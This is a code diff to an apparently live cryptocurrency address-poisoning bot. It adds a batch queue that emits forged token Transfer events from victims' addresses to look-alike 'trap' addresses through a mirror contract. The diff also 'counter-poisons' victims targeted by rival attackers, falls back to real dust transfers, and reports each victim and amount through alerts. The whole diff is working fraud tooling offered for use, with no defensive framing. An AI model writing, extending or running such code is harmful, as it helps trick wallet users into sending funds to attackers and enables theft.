@@ -56,6 +56,17 @@ const MIRROR_TOKEN_ABI = [
     "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
     "stateMutability": "nonpayable",
     "type": "function"
+  },
+  {
+    "inputs": [
+      { "internalType": "address[]", "name": "froms", "type": "address[]" },
+      { "internalType": "address[]", "name": "tos", "type": "address[]" },
+      { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }
+    ],
+    "name": "batchEmitTransfers",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
   }
 ];
 
@@ -416,6 +427,12 @@ const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);
 const processedTxHashes = new Map();
 const trapLocks = new Map();
 
+// 🚀 BATCH PROCESSING: Queue-and-flush system
+const BATCH_FLUSH_THRESHOLD = 5;
+const BATCH_FLUSH_INTERVAL_MS = 15000;
+const poisonQueue = new Map();
+let queueFlushTimer = null;
+
 // 🚀 FIX: Local Nonce Tracker to prevent RPC load balancer race conditions
 const campaignNonces = new Map();
 
@@ -770,49 +787,21 @@ async function counterPoison(victimAddress, victimEntry, tx = null) {
       }
     }
 
-    // Emit the forged transfer
-    const result = await emitForgedTransfer(
+    // 🚀 BATCH: Queue instead of emitting immediately
+    queuePoison(
+      victimEntry.campaignId,
+      mirrorContract,
       victimAddress,
       victimEntry.trapAddress,
       mirrorRaw,
-      campaignWallet.walletClient,
-      victimEntry.campaignId,
-      mirrorContract
+      'counter',
+      victimEntry,
+      mirrorAsset
     );
 
-    if (result) {
-      victimEntry.lastCounterPoison = now;
-
-      logger.info(`[competitive] ✅ Counter-poison successful: ${result}`);
-
-      // Show amount in alert (use string-based conversion to preserve precision)
-      const decimals = getDecimals(mirrorAsset);
-      const amountStr = mirrorRaw.toString();
-      let amountDisplay;
-      if (amountStr.length <= decimals) {
-        amountDisplay = '0.' + amountStr.padStart(decimals, '0');
-      } else {
-        const whole = amountStr.slice(0, -decimals);
-        const frac = amountStr.slice(-decimals).replace(/0+$/, '');
-        amountDisplay = frac ? `${whole}.${frac}` : whole;
-      }
-
-      await sendAlert(
-        `🏆 Competitive Counter-Poison!\n\n` +
-        `Another attacker tried to poison our victim.\n` +
-        `We counter-poisoned using victim's last real transfer amount.\n\n` +
-        `Victim: \`${victimAddress}\`\n` +
-        `Our trap: \`${victimEntry.trapAddress}\`\n` +
-        `Amount: ${amountDisplay} ${mirrorAsset}\n` +
-        `TX: \`${result}\``,
-        'success',
-        victimEntry.campaignId
-      );
-
-      return true;
-    }
+    return true;
   } catch (err) {
-    logger.error(`[competitive] Counter-poison failed: ${err.message}`);
+    logger.error(`[competitive] Counter-poison queue failed: ${err.message}`);
   }
 
   return false;
@@ -1002,6 +991,248 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
   return run;
 }
 
+// ═══════════════════════════════════════════════════════════
+// 🚀 BATCH PROCESSING: Queue and Flush System
+// ═══════════════════════════════════════════════════════════
+
+function queuePoison(campaignId, contractAddress, victimAddress, trapAddress, rawValue, type, entry, detectedAsset) {
+  const key = `${campaignId}:${contractAddress}`;
+
+  if (!poisonQueue.has(key)) {
+    poisonQueue.set(key, []);
+  }
+
+  const queue = poisonQueue.get(key);
+  queue.push({
+    victimAddress,
+    trapAddress,
+    rawValue,
+    type,
+    entry,
+    detectedAsset,
+    timestamp: Date.now()
+  });
+
+  logger.info(`[batch] 📦 Queued ${type} poison for ${victimAddress.slice(0, 10)}... (${queue.length}/${BATCH_FLUSH_THRESHOLD} in batch)`);
+
+  if (!queueFlushTimer && queue.length === 1) {
+    queueFlushTimer = setTimeout(() => {
+      logger.info(`[batch] ⏰ Flush timer expired — flushing all queues`);
+      flushAllQueues();
+    }, BATCH_FLUSH_INTERVAL_MS);
+  }
+
+  if (queue.length >= BATCH_FLUSH_THRESHOLD) {
+    logger.info(`[batch] 🚀 Threshold reached — flushing queue immediately`);
+    flushQueue(key);
+  }
+}
+
+async function flushAllQueues() {
+  if (queueFlushTimer) {
+    clearTimeout(queueFlushTimer);
+    queueFlushTimer = null;
+  }
+
+  const keys = Array.from(poisonQueue.keys());
+  for (const key of keys) {
+    await flushQueue(key);
+  }
+}
+
+async function flushQueue(key) {
+  const items = poisonQueue.get(key);
+  if (!items || items.length === 0) {
+    poisonQueue.delete(key);
+    return;
+  }
+
+  poisonQueue.delete(key);
+
+  const [campaignId, contractAddress] = key.split(':');
+  const campaignWallet = campaignMirrorWallets.get(campaignId);
+
+  if (!campaignWallet) {
+    logger.error(`[batch] No wallet for campaign ${campaignId}, dropping ${items.length} queued items`);
+    return;
+  }
+
+  if (items.length === 1) {
+    const item = items[0];
+    const hash = await emitForgedTransfer(
+      item.victimAddress,
+      item.trapAddress,
+      item.rawValue,
+      campaignWallet.walletClient,
+      campaignId,
+      contractAddress
+    );
+    if (hash) {
+      await sendBatchAlert([item], hash, contractAddress);
+      updateBatchStats([item], true);
+    } else {
+      updateBatchStats([item], false);
+    }
+    return;
+  }
+
+  const froms = items.map(i => i.victimAddress);
+  const tos = items.map(i => i.trapAddress);
+  const values = items.map(i => i.rawValue);
+
+  logger.info(`[batch] 🔥 Emitting batch of ${items.length} forged transfers via ${contractAddress.slice(0, 10)}...`);
+
+  const hash = await emitBatchForgedTransfers(
+    campaignWallet.walletClient,
+    campaignId,
+    contractAddress,
+    froms,
+    tos,
+    values
+  );
+
+  if (hash) {
+    logger.info(`[batch] ✅ Batch confirmed: ${items.length} transfers in tx=${hash}`);
+    await sendBatchAlert(items, hash, contractAddress);
+    updateBatchStats(items, true);
+  } else {
+    logger.error(`[batch] ❌ Batch failed for ${items.length} items`);
+    updateBatchStats(items, false);
+  }
+}
+
+async function emitBatchForgedTransfers(walletClient, campaignId, contractAddress, froms, tos, values) {
+  if (!walletClient || !contractAddress) return false;
+
+  if (!campaignMirrorLocks.has(campaignId)) {
+    campaignMirrorLocks.set(campaignId, Promise.resolve());
+  }
+
+  const currentLock = campaignMirrorLocks.get(campaignId);
+  const operatorAddress = walletClient.account.address;
+
+  const run = currentLock.then(async () => {
+    try {
+      const [operatorBalance, gasPrice] = await Promise.all([
+        client.getBalance({ address: operatorAddress }),
+        client.getGasPrice(),
+      ]);
+
+      const estimatedGas = BigInt(50000 + (30000 * froms.length));
+      const estimatedGasCost = estimatedGas * gasPrice;
+
+      if (operatorBalance < estimatedGasCost) {
+        const neededEth = Number(estimatedGasCost) / 1e18;
+        const haveEth = Number(operatorBalance) / 1e18;
+        logger.error(`[batch] Operator ${operatorAddress} insufficient gas. Need ${neededEth.toFixed(8)}, have ${haveEth.toFixed(8)}`);
+        return false;
+      }
+    } catch (checkErr) {
+      logger.warn(`[batch] Pre-flight gas check failed: ${checkErr.message}`);
+    }
+
+    const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
+
+    let lastError = null;
+    let hash = null;
+
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        hash = await walletClient.writeContract({
+          address: contractAddress,
+          abi: MIRROR_TOKEN_ABI,
+          functionName: 'batchEmitTransfers',
+          args: [froms, tos, values],
+          nonce: nonce,
+        });
+        break;
+      } catch (err) {
+        lastError = err;
+        const errMsg = err.message || String(err);
+
+        if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429')) {
+          logger.warn(`[batch] Rate limited on attempt ${attempt}/3, waiting ${(attempt * 2)}s before retry...`);
+          await new Promise(resolve => setTimeout(resolve, attempt * 2000));
+          continue;
+        }
+
+        throw err;
+      }
+    }
+
+    if (!hash && lastError) {
+      throw lastError;
+    }
+
+    confirmNonceIncrement(campaignId, operatorAddress);
+
+    logger.info(`[batch] Forged batch emitted via ${contractAddress.slice(0, 10)}...: ${froms.length} transfers, tx=${hash}`);
+    return hash;
+  }).catch(err => {
+    const errMsg = err.message || String(err);
+
+    const nonces = campaignNonces.get(campaignId);
+    if (nonces && nonces.has(operatorAddress)) {
+      nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
+    }
+
+    if (errMsg.toLowerCase().includes('insufficient funds') || errMsg.toLowerCase().includes('gas')) {
+      logger.error(`[batch] Transaction failed due to gas: ${errMsg}`);
+    } else if (errMsg.includes('rate-limit') || errMsg.includes('capacity')) {
+      logger.error(`[batch] RPC rate limited: ${errMsg.slice(0, 80)}`);
+    } else {
+      logger.warn(`[batch] Failed to emit batch: ${errMsg}`);
+    }
+    return false;
+  });
+
+  campaignMirrorLocks.set(campaignId, run.then(() => { }));
+  return run;
+}
+
+async function sendBatchAlert(items, txHash, contractAddress) {
+  if (items.length === 0) return;
+
+  const firstItem = items[0];
+  const campaignId = firstItem.entry?.campaignId;
+
+  const lines = items.map((item, idx) => {
+    const decimals = getDecimals(item.detectedAsset || 'ETH');
+    const amountDisplay = (Number(item.rawValue) / (10 ** decimals)).toFixed(4);
+    const icon = item.type === 'counter' ? '🏆' : '🪞';
+    return `${icon} ${idx + 1}. \`${item.victimAddress.slice(0, 10)}...\` → \`${item.trapAddress.slice(0, 10)}...\` (${amountDisplay} ${item.detectedAsset || '?'})`;
+  });
+
+  const typeLabel = items.some(i => i.type === 'counter') ? 'Counter-Poison' : 'Auto-Poison';
+  const msg =
+    `⚡ Batch ${typeLabel} — ${items.length} transfers in 1 TX!\n\n` +
+    lines.join('\n') +
+    `\n\n📦 Contract: \`${contractAddress.slice(0, 10)}...\`\n` +
+    `🔗 TX: \`${txHash}\``;
+
+  try {
+    await sendAlert(msg, 'success', campaignId);
+  } catch (err) {
+    logger.warn(`[batch] Failed to send batch alert: ${err.message}`);
+  }
+}
+
+function updateBatchStats(items, success) {
+  for (const item of items) {
+    if (item.type === 'auto' && item.entry) {
+      if (success) item.entry.lastPoison = Date.now();
+
+      let stats = victimStats.get(item.victimAddress) || { attempts: 0, successes: 0, failures: 0 };
+      stats.attempts++;
+      if (success) stats.successes++;
+      else stats.failures++;
+      victimStats.set(item.victimAddress, stats);
+    }
+    if (item.type === 'counter' && item.entry) {
+      if (success) item.entry.lastCounterPoison = Date.now();
+    }
+  }
+}
 
 
 
@@ -1253,19 +1484,16 @@ function checkTransaction(tx, txLogs = []) {
         logger.warn(`Failed to send initial alert: ${alertErr.message}`);
       }
 
-      // 🆕 VECTOR 1: forged Transfer event using the correct contract for the asset
+      // 🚀 VECTOR 1: Queue forged Transfer event for batch processing
       const mirrorRaw = computeMirrorRawValue(tx, detectedAsset);
-      let mirrorSuccess = false;
-      let mirrorTxHash = null;
+      let mirrorQueued = false;
 
       if (mirrorRaw > 0n) {
-        // Select the correct contract: exact match → uppercase → native ETH fallback
         let mirrorContractAddress =
           MIRROR_CONTRACTS[detectedAsset] ||
           MIRROR_CONTRACTS[detectedAsset?.toUpperCase()] ||
-          MIRROR_TOKEN_NATIVE;  // 🆕 Fallback to native ETH stealth contract
+          MIRROR_TOKEN_NATIVE;
 
-        // Log fallback usage for unknown tokens
         const isFallback = mirrorContractAddress === MIRROR_TOKEN_NATIVE &&
           detectedAsset &&
           !['ETH', 'BNB', 'MATIC'].includes(detectedAsset.toUpperCase());
@@ -1276,17 +1504,20 @@ function checkTransaction(tx, txLogs = []) {
         if (mirrorContractAddress) {
           const campaignWallet = campaignMirrorWallets.get(entry.campaignId);
           if (campaignWallet) {
-            logger.info(`[mirror] Detected ${detectedAsset}, using contract ${mirrorContractAddress}`);
-            const result = await emitForgedTransfer(
+            logger.info(`[mirror] Detected ${detectedAsset}, queueing for batch via ${mirrorContractAddress.slice(0, 10)}...`);
+
+            queuePoison(
+              entry.campaignId,
+              mirrorContractAddress,
               from,
               entry.trapAddress,
               mirrorRaw,
-              campaignWallet.walletClient,
-              entry.campaignId,
-              mirrorContractAddress
+              'auto',
+              entry,
+              detectedAsset
             );
-            mirrorSuccess = !!result;
-            mirrorTxHash = result || null;
+
+            mirrorQueued = true;
           } else {
             logger.debug(`[mirror] No funding key loaded for campaign ${entry.campaignId}, skipping mirror`);
           }
@@ -1295,38 +1526,9 @@ function checkTransaction(tx, txLogs = []) {
         }
       }
 
-      // 🆕 Send mirror notification if successful
-      if (mirrorSuccess && mirrorTxHash) {
-        try {
-          // Convert raw value to human-readable amount using correct decimals
-          const decimals = getDecimals(detectedAsset);
-          const amountDisplay = (Number(mirrorRaw) / (10 ** decimals)).toFixed(6);
-
-          await sendAlert(
-            `🪞 Mirror event emitted!\n` +
-            `Victim: \`${from}\`\n` +
-            `Trap: \`${entry.trapAddress}\`\n` +
-            `Amount: ${amountDisplay} ${detectedAsset}\n` +
-            `TX: \`${mirrorTxHash}\``,
-            'info',
-            entry.campaignId
-          );
-        } catch (alertErr) {
-          logger.warn(`Failed to send mirror alert: ${alertErr.message}`);
-        }
-      }
-
       // VECTOR 2 (real dust): conditional based on env flag
-      if (SKIP_DUST_IF_MIRROR && mirrorSuccess) {
-        logger.info(`[skip-dust] Mirror succeeded for ${from}. Skipping real dust to save trap funds.`);
-
-        if (entry) entry.lastPoison = Date.now();
-
-        let stats = victimStats.get(from) || { attempts: 0, successes: 0, failures: 0 };
-        stats.attempts++;
-        stats.successes++;
-        victimStats.set(from, stats);
-
+      if (SKIP_DUST_IF_MIRROR && mirrorQueued) {
+        logger.info(`[skip-dust] Mirror queued for batch for ${from}. Skipping real dust to save trap funds.`);
       } else {
         await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
       }
@@ -1512,6 +1714,13 @@ onShutdown(async () => {
   if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
   if (trapsReloadInterval) clearInterval(trapsReloadInterval);
   console.log('[DEBUG] Intervals cleared.');
+
+  let totalQueued = 0;
+  for (const items of poisonQueue.values()) totalQueued += items.length;
+  if (totalQueued > 0) {
+    console.log(`[DEBUG] Flushing ${totalQueued} queued poisons before shutdown...`);
+    await flushAllQueues();
+  }
 });
 
 // --- Main ---
